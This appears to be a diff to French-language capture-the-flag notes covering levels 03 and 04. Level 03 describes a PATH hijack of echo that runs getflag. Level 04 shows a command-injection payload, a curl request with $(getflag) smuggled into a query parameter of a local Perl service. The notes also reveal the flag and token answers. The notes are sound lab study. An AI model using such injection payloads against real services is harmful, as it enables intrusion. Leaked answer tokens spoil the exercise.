@@ -55,3 +55,12 @@ ls -l ./level03 a le groupe flag03
 en desassemblant le binaire, la string est ecrite comme ceci "/usr/bin/env echo Exploit me"
 
 en utilisant un autre echo on peut appeler getflag et avoir le flag `qi0maab88jeaj46qoumi7maus`
+
+
+# level 04
+fichier perl qui resume le contenu d'un serveur, imprime le contenu de la variable x
+curl "http://127.0.0.1:4747/?x=\$(getflag)"
+```
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+```
+
